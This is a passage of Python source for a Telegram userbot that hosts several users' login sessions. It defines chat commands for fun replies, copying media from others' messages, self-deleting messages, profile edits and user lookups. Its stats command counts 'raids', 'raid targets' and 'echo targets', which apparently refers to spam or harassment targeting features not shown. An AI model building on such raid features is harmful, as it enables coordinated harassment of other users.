        elif cmd == "slap":
            await event.edit("👋💥 **Slapped!**")
        else:
            await event.edit("🤗 **Warm hug sent!**")

    @ubot.on(events.NewMessage(pattern=r'^\.(8ball|fact|shayari)\b', outgoing=True))
    async def info_fun_cmd(event):
        cmd = event.pattern_match.group(1)
        if cmd == "8ball":
            ans = random.choice(["Haan bilkul!", "Shayad.", "Abhi nahi.", "Pakka samjho."])
            await event.edit(f"🎱 **8Ball:** {ans}")
        elif cmd == "fact":
            await event.edit("💡 **Fact:** Telegram MTProto fast encrypted messaging aur bots/userbots dono support karta hai.")
        else:
            await event.edit("✨ **Shayari:**\n*Waqt aur samundar ki lehrein kisi ka intezar nahi kartin,* \n*Apni pehchan khud banani padti hai.*")

    @ubot.on(events.NewMessage(pattern=r'^\.steal$', outgoing=True))
    async def steal_media_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi media/photo/video message par reply karke `.steal` likhein.**")
            return
        rep = await event.get_reply_message()
        if not rep or not rep.media:
            await event.edit("❌ **Replied message mein koi media nahi hai.**")
            return
        tmp_path = None
        try:
            dl = await ubot.download_media(rep.media)
            if not dl:
                await event.edit("❌ **Media download nahi ho saka.**")
                return
            tmp_path = dl if isinstance(dl, str) else None
            await ubot.send_file("me", dl, caption=rep.raw_text or "Stolen media")
            await event.edit("📥 **Media Saved Messages mein save ho gaya.**")
        except Exception as e:
            await event.edit(f"❌ **Steal fail:** `{e}`")
        finally:
            if tmp_path and os.path.exists(tmp_path) and tmp_path.startswith("/tmp"):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

    @ubot.on(events.NewMessage(pattern=r'^\.caption\b', outgoing=True))
    async def set_caption_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Media message par reply karke `.caption <text>` likhein.**")
            return
        rep = await event.get_reply_message()
        if not rep or not rep.media:
            await event.edit("❌ **Replied message mein koi media nahi hai.**")
            return
        parts = event.raw_text.split(maxsplit=1)
        new_cap = parts[1].strip() if len(parts) > 1 and parts[1].strip() else ""
        try:
            await ubot.send_file(event.chat_id, rep.media, caption=new_cap)
            try:
                await event.delete()
            except Exception:
                pass
        except Exception as e:
            await event.edit(f"❌ **Caption send fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.ghost\b', outgoing=True))
    async def ghost_msg_cmd(event):
        parts = event.raw_text.split(maxsplit=2)
        delay = 5
        text = "👻 *Ghost message*"
        if len(parts) >= 2 and parts[1].isdigit():
            delay = max(1, min(int(parts[1]), 120))
            text = parts[2] if len(parts) > 2 else text
        elif len(parts) >= 2:
            text = " ".join(parts[1:])
        msg = await event.edit(text)
        await asyncio.sleep(delay)
        try:
            await msg.delete()
        except Exception:
            pass

    @ubot.on(events.NewMessage(pattern=r'^\.tginfo$', outgoing=True))
    async def tginfo_cmd(event):
        ent = await _target_entity_from_event(event)
        if not ent:
            ent = await ubot.get_entity(event.chat_id)
        eid = getattr(ent, "id", "N/A")
        uname = f"@{ent.username}" if getattr(ent, "username", None) else "None"
        title = getattr(ent, "title", None) or getattr(ent, "first_name", "Unknown")
        await event.edit(
            f"🪪 **TG Info**\n"
            f"• **Name/Title:** `{title}`\n"
            f"• **ID:** `{eid}`\n"
            f"• **Username:** `{uname}`"
        )

    @ubot.on(events.NewMessage(pattern=r'^\.bio\b', outgoing=True))
    async def set_bio_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2:
            await event.edit("ℹ️ **Istemaal:** `.bio <apna bio>`")
            return
        bio_txt = parts[1].strip()[:70]
        try:
            me = await ubot.get_me()
            await ubot(UpdateProfileRequest(
                first_name=getattr(me, "first_name", "") or "User",
                last_name=getattr(me, "last_name", "") or "",
                about=bio_txt
            ))
            await event.edit(f"📝 **Bio update ho gayi:** `{bio_txt}`")
        except Exception as e:
            await event.edit(f"❌ **Bio fail:** `{e}`")

    @ubot.on(events.NewMessage(pattern=r'^\.name\b', outgoing=True))
    async def set_name_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip():
            await event.edit("ℹ️ **Istemaal:** `.name FirstName | LastName`")
            return
        raw = parts[1].strip()
        if "|" in raw:
            f_name, l_name = [x.strip() for x in raw.split("|", 1)]
        else:
            f_name, l_name = raw, ""
        try:
            full_me = await ubot(GetFullUserRequest((await ubot.get_me()).id))
            cur_about = (getattr(getattr(full_me, "full_user", None), "about", "") or "")[:70]
            await ubot(UpdateProfileRequest(first_name=f_name, last_name=l_name, about=cur_about))
            await event.edit(f"✍️ **Naam badal gaya:** `{f_name} {l_name}`".strip())
        except Exception as e:
            await event.edit(f"❌ **Name fail:** `{e}`")

    # 13. PING, PING2, UPTIME, ALIVE, ID, INFO, WHOIS, CHATINFO, STATS, TIME, DATE, AFK, TIMEBIO, SAVE
    @ubot.on(events.NewMessage(pattern=r'^\.ping$', outgoing=True))
    async def ping_cmd(event):
        t0 = time.time()
        msg = await event.edit("🏓 **Pinging...**")
        ms = int((time.time() - t0) * 1000)
        await msg.edit(f"🏓 **Pong!** `{ms}ms` | **Uptime:** `{format_uptime()}`")

    @ubot.on(events.NewMessage(pattern=r'^\.ping2$', outgoing=True))
    async def ping2_cmd(event):
        t0 = time.time()
        msg = await event.edit("⚡ **Checking speed...**")
        ms = int((time.time() - t0) * 1000)
        await msg.edit(f"⚡ **Speed:** `{ms}ms` • **Uptime:** `{format_uptime()}`")

    @ubot.on(events.NewMessage(pattern=r'^\.uptime$', outgoing=True))
    async def uptime_cmd(event):
        await event.edit(f"⏱️ **Uptime:** `{format_uptime()}`")

    @ubot.on(events.NewMessage(pattern=r'^\.(alive|alive2)$', outgoing=True))
    async def alive_cmd(event):
        me = await ubot.get_me()
        await event.edit(
            f"⚡ **{BOT_BRAND} IS ALIVE!**\n"
            f"• **User:** `{getattr(me, 'first_name', 'User')}` (`{me.id}`)\n"
            f"• **Owner:** `{OWNER_NAME}`\n"
            f"• **Uptime:** `{format_uptime()}`"
        )

    @ubot.on(events.NewMessage(pattern=r'^\.(id|id2)$', outgoing=True))
    async def id_cmd(event):
        target_id = event.chat_id
        if event.is_reply:
            rep = await event.get_reply_message()
            target_id = rep.sender_id or event.chat_id
        await event.edit(f"🆔 **ID:** `{target_id}` | **Chat ID:** `{event.chat_id}`")

    @ubot.on(events.NewMessage(pattern=r'^\.(info|info2|whois|whois2)$', outgoing=True))
    async def whois_cmd(event):
        ent = await _target_entity_from_event(event)
        if not ent:
            ent = await ubot.get_me()
        uname_str = f"@{ent.username}" if getattr(ent, "username", None) else "None"
        await event.edit(
            f"👤 **User Info**\n"
            f"• **First Name:** `{getattr(ent, 'first_name', 'N/A')}`\n"
            f"• **Last Name:** `{getattr(ent, 'last_name', '') or ''}`\n"
            f"• **Username:** `{uname_str}`\n"
            f"• **ID:** `{getattr(ent, 'id', 'N/A')}`"
        )

    @ubot.on(events.NewMessage(pattern=r'^\.(chatinfo|chatinfo2)$', outgoing=True))
    async def chatinfo_cmd(event):
        ent = await ubot.get_entity(event.chat_id)
        await event.edit(
            f"💬 **Chat Info**\n"
            f"• **Title:** `{getattr(ent, 'title', getattr(ent, 'first_name', 'Chat'))}`\n"
            f"• **ID:** `{event.chat_id}`"
        )

    @ubot.on(events.NewMessage(pattern=r'^\.(stats|stats2)$', outgoing=True))
    async def stats_cmd(event):
        await event.edit(
            f"📊 **Stats**\n"
            f"• **Hosted Sessions:** `{len(user_sessions)}`\n"
            f"• **Active Raids:** `{len(active_raids)}`\n"
            f"• **RRAID Targets:** `{len(rraid_targets)}`\n"
            f"• **Echo Targets:** `{len(echo_targets)}`\n"
            f"• **Uptime:** `{format_uptime()}`"
        )

    @ubot.on(events.NewMessage(pattern=r'^\.time$', outgoing=True))
    async def time_cmd(event):
        await event.edit(f"🕒 **Time:** `{datetime.now().strftime('%I:%M:%S %p')}`")

    @ubot.on(events.NewMessage(pattern=r'^\.date$', outgoing=True))
    async def date_cmd(event):
        await event.edit(f"📅 **Date:** `{datetime.now().strftime('%d %B %Y (%A)')}`")

    @ubot.on(events.NewMessage(pattern=r'^\.afk\b', outgoing=True))
    async def afk_cmd(event):
        parts = event.raw_text.split(maxsplit=1)
        reason = parts[1].strip() if len(parts) > 1 and parts[1].strip() else "Busy"
        afk_status[owner_id] = reason
        await event.edit(f"💤 **AFK ON:** `{reason}`")

    async def _timebio_loop():
        try:
            while True:
                now_str = datetime.now().strftime("%I:%M %p")
                bio_txt = f"🕒 {now_str} | {BOT_BRAND}"[:70]
                try:
                    me = await ubot.get_me()
                    await ubot(UpdateProfileRequest(
                        first_name=getattr(me, "first_name", "") or "User",
                        last_name=getattr(me, "last_name", "") or "",
                        about=bio_txt
                    ))
                except Exception:
                    pass
                await asyncio.sleep(60)
        except asyncio.CancelledError:
            pass

    @ubot.on(events.NewMessage(pattern=r'^\.timebio\s+(on|off)$', outgoing=True))
    async def timebio_cmd(event):
        mode = event.pattern_match.group(1).lower()
        existing = timebio_tasks.pop(owner_id, None)
        if existing:
            existing.cancel()
        if mode == "on":
            timebio_tasks[owner_id] = asyncio.create_task(_timebio_loop())
            await event.edit("🕒 **Live Time Bio `ON`.**")
        else:
            await event.edit("🛑 **Live Time Bio `OFF`.**")

    @ubot.on(events.NewMessage(pattern=r'^\.(save|save2)$', outgoing=True))
    async def save_msg_cmd(event):
        if not event.is_reply:
            await event.edit("ℹ️ **Kisi message par reply karke `.save` likhein.**")
            return
        rep = await event.get_reply_message()
        try:
            await ubot.forward_messages("me", rep)
            await event.edit("💾 **Saved Messages mein forward kar diya gaya.**")
        except Exception as e:
            await event.edit(f"❌ **Save fail:** `{e}`")

    try:
        await ubot.start()
        print(f"[Userbot Started] owner_id={owner_id}", flush=True)
        await ubot.run_until_disconnected()
    finally:
        if running_ubot_clients.get(owner_id) is ubot:
            running_ubot_clients.pop(owner_id, None)


async def main():
    for uid_str, s_str in list(user_sessions.items()):
        try:
            uid_int = int(uid_str)
            asyncio.create_task(start_userbot_session(s_str, uid_int))
        except Exception as e:
            print(f"Failed to resume session {uid_str}: {e}", flush=True)

    await bot.start(bot_token=BOT_TOKEN)
    await sync_bot_menu_commands()
    print(f"=== {BOT_BRAND} IS LIVE ===", flush=True)
    await bot.run_until_disconnected()


if __name__ == "__main__":
    loop.run_until_complete(main())
